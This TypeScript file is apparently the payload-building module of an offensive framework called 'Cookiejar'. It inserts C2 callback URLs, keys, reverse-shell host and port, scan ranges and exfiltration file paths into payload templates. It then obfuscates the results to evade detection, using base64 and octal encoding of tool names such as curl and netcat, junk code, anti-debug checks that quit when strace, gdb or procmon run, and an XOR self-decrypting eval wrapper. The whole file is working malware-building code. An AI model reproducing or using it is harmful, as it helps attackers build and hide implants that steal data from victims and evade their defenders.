/**
 * Cookiejar Bake Module
 *
 * The "Bake" module takes raw templates from the Oven and "bakes" them into
 * final payloads by:
 * 1. Substituting configuration variables (C2 URLs, keys, etc.)
 * 2. Applying obfuscation techniques
 * 3. Adding anti-debug and anti-analysis features
 * 4. Encoding/encrypting sensitive strings
 *
 * Obfuscation levels:
 * - none: Direct substitution only
 * - light: Basic string encoding
 * - medium: String encoding + junk code
 * - heavy: Full obfuscation with control flow changes
 */

import type { DoughConfig } from "../dough/mod.ts";
import { OvenTemplates } from "../oven/mod.ts";

/**
 * Bake Service - Transform templates into obfuscated payloads
 */
export class BakeService {
  /**
   * Main baking function - takes config and returns final payload code
   */
  static bake(config: DoughConfig): string {
    // Get the base template
    let code = OvenTemplates.getTemplate(config);

    // Substitute variables
    code = this.substituteVariables(code, config);

    // Apply obfuscation based on level
    switch (config.obfuscationLevel) {
      case "none":
        // No obfuscation, just return with substituted vars
        return code;

      case "light":
        code = this.applyLightObfuscation(code, config);
        break;

      case "medium":
        code = this.applyLightObfuscation(code, config);
        code = this.applyMediumObfuscation(code, config);
        break;

      case "heavy":
        code = this.applyLightObfuscation(code, config);
        code = this.applyMediumObfuscation(code, config);
        code = this.applyHeavyObfuscation(code, config);
        break;
    }

    return code;
  }

  /**
   * Substitute template variables with actual values
   */
  private static substituteVariables(template: string, config: DoughConfig): string {
    const { c2Config, options } = config;

    let result = template;

    // Core C2 configuration
    result = result.replace(/\{\{C2_URL\}\}/g, c2Config.callbackUrl);
    result = result.replace(/\{\{PAYLOAD_ID\}\}/g, c2Config.payloadId);
    result = result.replace(/\{\{HMAC_KEY\}\}/g, c2Config.hmacKey);
    result = result.replace(/\{\{ENCRYPTION_KEY\}\}/g, c2Config.encryptionKey);
    result = result.replace(/\{\{MAX_CALLBACKS\}\}/g, c2Config.maxCallbacks.toString());

    // Reverse TCP specific
    if (c2Config.callbackUrl) {
      const url = new URL(c2Config.callbackUrl);
      result = result.replace(/\{\{C2_HOST\}\}/g, url.hostname);
      result = result.replace(/\{\{C2_PORT\}\}/g, options?.bindPort?.toString() || "4444");
    }

    // Network scanner CIDR
    if (options?.scanCidr) {
      result = result.replace(/\{\{SCAN_CIDR\}\}/g, options.scanCidr);
    }

    // File exfiltration paths
    if (options?.targetPaths) {
      // For bash arrays
      const bashArray = options.targetPaths.map(p => `"${p}"`).join(" ");
      result = result.replace(/\{\{TARGET_PATHS\}\}/g, bashArray);

      // For JSON arrays
      const jsonArray = JSON.stringify(options.targetPaths);
      result = result.replace(/\{\{TARGET_PATHS_JSON\}\}/g, jsonArray);
    }

    // Custom variables
    if (options?.customVars) {
      for (const [key, value] of Object.entries(options.customVars)) {
        const pattern = new RegExp(`\\{\\{${key}\\}\\}`, 'g');
        result = result.replace(pattern, value);
      }
    }

    return result;
  }

  /**
   * Light obfuscation: Basic string encoding
   */
  private static applyLightObfuscation(code: string, config: DoughConfig): string {
    const targetEnv = config.targetEnvironment;

    // Detect language from code and apply environment-specific optimizations
    if (code.includes("#!/bin/bash") || code.includes("#!/bin/sh")) {
      return this.obfuscateBashLight(code);
    } else if (code.startsWith("#") && code.includes("PowerShell")) {
      return this.obfuscatePowerShellLight(code);
    } else if (code.includes("function(") || code.includes("const ") || code.includes("let ")) {
      return this.obfuscateJavaScriptLight(code);
    } else if (code.includes("def ") || code.includes("import ")) {
      return this.obfuscatePythonLight(code);
    }

    // Apply fallback obfuscation based on target environment OS
    if (targetEnv.os === "linux" || targetEnv.os === "macos") {
      return this.obfuscateBashLight(code);
    } else if (targetEnv.os === "windows") {
      return this.obfuscatePowerShellLight(code);
    }

    return code;
  }

  /**
   * Medium obfuscation: String encoding + junk code + variable renaming
   */
  private static applyMediumObfuscation(code: string, config: DoughConfig): string {
    // Add junk code/comments
    code = this.addJunkCode(code);

    // Randomize whitespace
    code = this.randomizeWhitespace(code);

    // Apply additional string obfuscation using hex/octal encoding for sensitive patterns
    if (config.obfuscationLevel === "medium" || config.obfuscationLevel === "heavy") {
      // Use hex encoding for certain sensitive strings
      code = this.applyAdvancedStringObfuscation(code);
    }

    return code;
  }

  /**
   * Heavy obfuscation: Full obfuscation with control flow changes
   */
  private static applyHeavyObfuscation(code: string, config: DoughConfig): string {
    // Add anti-debugging
    code = this.addAntiDebug(code);

    // Add control flow obfuscation
    code = this.obfuscateControlFlow(code);

    // Apply encryption if encryption key is available
    if (config.c2Config.encryptionKey && config.c2Config.encryptionKey.length > 0) {
      code = this.encryptPayload(code, config.c2Config.encryptionKey);
    }

    return code;
  }

  // ========================================
  // BASH OBFUSCATION
  // ========================================

  private static obfuscateBashLight(code: string): string {
    // Encode sensitive strings in base64
    const sensitivePatterns = [
      { pattern: /C2_URL="([^"]+)"/g, name: "C2_URL" },
      { pattern: /PAYLOAD_ID="([^"]+)"/g, name: "PAYLOAD_ID" },
      { pattern: /HMAC_KEY="([^"]+)"/g, name: "HMAC_KEY" }
    ];

    sensitivePatterns.forEach(({ pattern, name }) => {
      code = code.replace(pattern, (match, value) => {
        // Verify match contains the variable assignment
        if (!match.includes(name)) return match;
        const encoded = btoa(value);
        return `${name}=$(echo "${encoded}" | base64 -d)`;
      });
    });

    return code;
  }

  // ========================================
  // POWERSHELL OBFUSCATION
  // ========================================

  private static obfuscatePowerShellLight(code: string): string {
    // Encode strings in base64
    const sensitivePatterns = [
      { pattern: /\$C2_URL = "([^"]+)"/g, name: "C2_URL" },
      { pattern: /\$PAYLOAD_ID = "([^"]+)"/g, name: "PAYLOAD_ID" },
      { pattern: /\$HMAC_KEY = "([^"]+)"/g, name: "HMAC_KEY" }
    ];

    sensitivePatterns.forEach(({ pattern, name }) => {
      code = code.replace(pattern, (match, value) => {
        // Verify match contains the variable assignment
        if (!match.includes(name)) return match;
        const encoded = btoa(value);
        return `$${name} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${encoded}"))`;
      });
    });

    return code;
  }

  // ========================================
  // JAVASCRIPT OBFUSCATION
  // ========================================

  private static obfuscateJavaScriptLight(code: string): string {
    // Encode string literals
    const sensitivePatterns = [
      { pattern: /const C2_URL = "([^"]+)"/g, name: "C2_URL" },
      { pattern: /const PAYLOAD_ID = "([^"]+)"/g, name: "PAYLOAD_ID" },
      { pattern: /const HMAC_KEY = "([^"]+)"/g, name: "HMAC_KEY" }
    ];

    sensitivePatterns.forEach(({ pattern, name }) => {
      code = code.replace(pattern, (match, value) => {
        // Verify match contains the variable assignment
        if (!match.includes(name)) return match;
        const encoded = btoa(value);
        return `const ${name} = atob("${encoded}")`;
      });
    });

    // Rename common variable names to obscure ones
    const varMap = new Map([
      ['data', this.randomVarName()],
      ['result', this.randomVarName()],
      ['response', this.randomVarName()]
    ]);

    // Apply variable renaming (simple approach - just in declarations)
    varMap.forEach((newName, oldName) => {
      // Only rename variable declarations to avoid breaking existing code
      code = code.replace(
        new RegExp(`const ${oldName} =`, 'g'),
        `const ${newName} =`
      );
      code = code.replace(
        new RegExp(`let ${oldName} =`, 'g'),
        `let ${newName} =`
      );
    });

    return code;
  }

  // ========================================
  // PYTHON OBFUSCATION
  // ========================================

  private static obfuscatePythonLight(code: string): string {
    // Encode strings in base64
    const sensitivePatterns = [
      { pattern: /C2_URL = "([^"]+)"/g, name: "C2_URL" },
      { pattern: /PAYLOAD_ID = "([^"]+)"/g, name: "PAYLOAD_ID" },
      { pattern: /HMAC_KEY = "([^"]+)"/g, name: "HMAC_KEY" }
    ];

    sensitivePatterns.forEach(({ pattern, name }) => {
      code = code.replace(pattern, (match, value) => {
        // Verify match contains the variable assignment
        if (!match.includes(name)) return match;
        const encoded = btoa(value);
        return `${name} = __import__('base64').b64decode("${encoded}").decode()`;
      });
    });

    return code;
  }

  /**
   * Apply advanced string obfuscation using hex/octal encoding and string splitting
   */
  private static applyAdvancedStringObfuscation(code: string): string {
    // Detect language and apply appropriate advanced obfuscation
    if (code.includes("#!/bin/bash") || code.includes("#!/bin/sh")) {
      // Bash: Use octal encoding for certain strings
      const sensitiveStrings = [
        'wget', 'curl', 'nc', 'netcat', 'python', 'perl', 'ruby'
      ];

      sensitiveStrings.forEach(str => {
        const octalEncoded = this.toOctal(str);
        // Replace standalone commands with octal-encoded versions
        const pattern = new RegExp(`\\b${str}\\b`, 'g');
        code = code.replace(pattern, `$'${octalEncoded}'`);
      });
    } else if (code.includes("function(") || code.includes("const ") || code.includes("let ")) {
      // JavaScript: Split sensitive strings into chunks
      const urlPattern = /(https?:\/\/[^\s"']+)/g;
      code = code.replace(urlPattern, (match, url) => {
        // Validate that the match is a proper URL before obfuscating
        if (!match.startsWith('http')) return match;
        const chunks = this.splitString(url, 8);
        const chunksStr = chunks.map(c => `"${c}"`).join(' + ');
        return chunksStr;
      });
    } else if (code.includes("PowerShell")) {
      // PowerShell: Use hex encoding for URLs and sensitive strings
      const urlPattern = /(https?:\/\/[^\s"']+)/g;
      code = code.replace(urlPattern, (match, url) => {
        // Validate that the match is a proper URL before obfuscating
        if (!match.startsWith('http')) return match;
        const hex = this.toHex(url);
        return `([System.Text.Encoding]::UTF8.GetString([byte[]]@(${hex.match(/.{2}/g)?.map(h => '0x' + h).join(',') || ''})))`;
      });
    }

    return code;
  }

  // ========================================
  // GENERAL OBFUSCATION TECHNIQUES
  // ========================================

  /**
   * Add junk code and comments to make analysis harder
   */
  private static addJunkCode(code: string): string {
    const lines = code.split('\n');
    const junkComments = [
      '# Configuration loading',
      '# Initialize runtime',
      '# Setup environment',
      '# Verify permissions',
      '# Check dependencies',
      '// Runtime initialization',
      '// Environment setup',
      '// Configuration validation'
    ];

    // Insert junk comments randomly
    const newLines: string[] = [];
    lines.forEach((line, index) => {
      newLines.push(line);

      // 20% chance to add junk comment after each line
      if (Math.random() < 0.2 && index < lines.length - 1) {
        const junk = junkComments[Math.floor(Math.random() * junkComments.length)];
        newLines.push(junk);
      }
    });

    return newLines.join('\n');
  }

  /**
   * Randomize whitespace to make signature detection harder
   */
  private static randomizeWhitespace(code: string): string {
    const lines = code.split('\n');

    const newLines = lines.map(line => {
      // Skip empty lines and shebang
      if (!line.trim() || line.startsWith('#!')) {
        return line;
      }

      // Randomly add extra spaces (10% chance)
      if (Math.random() < 0.1) {
        return line + ' '.repeat(Math.floor(Math.random() * 3));
      }

      return line;
    });

    return newLines.join('\n');
  }

  /**
   * Add anti-debugging checks
   */
  private static addAntiDebug(code: string): string {
    if (code.includes("#!/bin/bash")) {
      // Bash anti-debug
      const antiDebug = `
# Anti-debug checks
if [ -n "$BASH_XTRACEFD" ] || [ -n "$PS4" ]; then
  exit 0
fi

if pgrep -x "strace\\|ltrace\\|gdb" > /dev/null 2>&1; then
  exit 0
fi
`;
      // Insert after shebang
      code = code.replace(/^#!\/bin\/bash\n/, `#!/bin/bash\n${antiDebug}`);
    } else if (code.includes("PowerShell")) {
      // PowerShell anti-debug
      const antiDebug = `
# Anti-debug checks
if ($PSDebugContext) { exit }
if (Get-Process -Name "procmon*","procexp*","wireshark*" -ErrorAction SilentlyContinue) { exit }
`;
      code = code.replace(/# BlkBox.*\n/, (match) => match + antiDebug);
    } else if (code.includes("function(") && code.includes("const ")) {
      // JavaScript anti-debug (already has DevTools check in templates)
      const antiDebug = `
  // Timing check for debugger
  const start = performance.now();
  debugger;
  const end = performance.now();
  if (end - start > 100) return; // Debugger detected
`;
      // Insert at start of IIFE
      code = code.replace(/\(function\(\) \{\n\s{2}'use strict';\n/, (match) => match + antiDebug);
    }

    return code;
  }

  /**
   * Obfuscate control flow with conditional branches
   */
  private static obfuscateControlFlow(code: string): string {
    if (code.includes("#!/bin/bash")) {
      // Add dummy conditional branches in bash
      const dummyBranches = `
# Control flow obfuscation
if [ $(( RANDOM % 2 )) -eq 0 ]; then
  : # Intentional no-op
else
  : # Intentional no-op
fi
`;
      const lines = code.split('\n');
      const mainIndex = lines.findIndex(l => l.includes('main()') || l.includes('# Main execution'));
      if (mainIndex > 0) {
        lines.splice(mainIndex, 0, dummyBranches);
        code = lines.join('\n');
      }
    } else if (code.includes("function(") && code.includes("const ")) {
      // Add dummy branches in JavaScript
      const dummyBranches = `
  // Control flow obfuscation
  if (Math.random() > 1.5) {
    console.log(Math.random());
  }
`;
      code = code.replace(/const collectBrowserInfo/, dummyBranches + '  const collectBrowserInfo');
    }

    return code;
  }

  /**
   * Generate random variable name
   */
  private static randomVarName(): string {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    const length = 8 + Math.floor(Math.random() * 4); // 8-12 chars
    let name = chars[Math.floor(Math.random() * chars.length)]; // Start with letter

    for (let i = 1; i < length; i++) {
      const allChars = chars + '0123456789';
      name += allChars[Math.floor(Math.random() * allChars.length)];
    }

    return name;
  }

  /**
   * Encode string to hex
   */
  private static toHex(str: string): string {
    return Array.from(str)
      .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
      .join('');
  }

  /**
   * Encode string to octal (bash-safe)
   */
  private static toOctal(str: string): string {
    return Array.from(str)
      .map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0'))
      .join('');
  }

  /**
   * Split string into chunks for obfuscation
   */
  private static splitString(str: string, chunkSize: number = 8): string[] {
    const chunks: string[] = [];
    for (let i = 0; i < str.length; i += chunkSize) {
      chunks.push(str.substring(i, i + chunkSize));
    }
    return chunks;
  }

  /**
   * Advanced JavaScript string obfuscation using array-based encoding
   */
  static obfuscateJSString(str: string): string {
    // Convert to array of char codes, then create a decoder expression
    const charCodes = Array.from(str).map(c => c.charCodeAt(0));
    return `String.fromCharCode(${charCodes.join(',')})`;
  }

  /**
   * PowerShell string obfuscation using char array
   */
  static obfuscatePSString(str: string): string {
    const charCodes = Array.from(str).map(c => c.charCodeAt(0));
    return `-join([char[]]@(${charCodes.join(',')}))`;
  }

  /**
   * Add encryption layer (simple XOR for demo, real implementation would use AES)
   */
  static encryptPayload(code: string, key: string): string {
    // Simple XOR encryption (for demonstration)
    // In production, use proper AES-GCM encryption
    const encrypted = Array.from(code).map((char, i) => {
      const keyChar = key.charCodeAt(i % key.length);
      return char.charCodeAt(0) ^ keyChar;
    });

    const encryptedHex = encrypted.map(n => n.toString(16).padStart(2, '0')).join('');
    const keyLength = key.length;

    // Return self-decrypting wrapper with properly escaped bash variables
    return `
# Encrypted payload
ENCRYPTED="${encryptedHex}"
KEY="${key}"

# Decrypt and execute
decrypt() {
  local hex="\$1"
  local key="\$2"
  local result=""

  for ((i=0; i<\${#hex}; i+=2)); do
    local byte=\$((16#\${hex:\$i:2}))
    local key_byte=\$(printf "%d" "'\${key:\$((i/2 % ${keyLength})):1}")
    local decrypted=\$((byte ^ key_byte))
    result="\$result\$(printf "\\\\\\\\\$(printf '%03o' \$decrypted)")"
  done

  echo -e "\$result"
}

# Execute decrypted payload
eval "\$(decrypt "\$ENCRYPTED" "\$KEY")"
`;
  }
}

/**
 * Helper function to quickly bake a payload
 */
export function bakePayload(config: DoughConfig): string {
  return BakeService.bake(config);
}
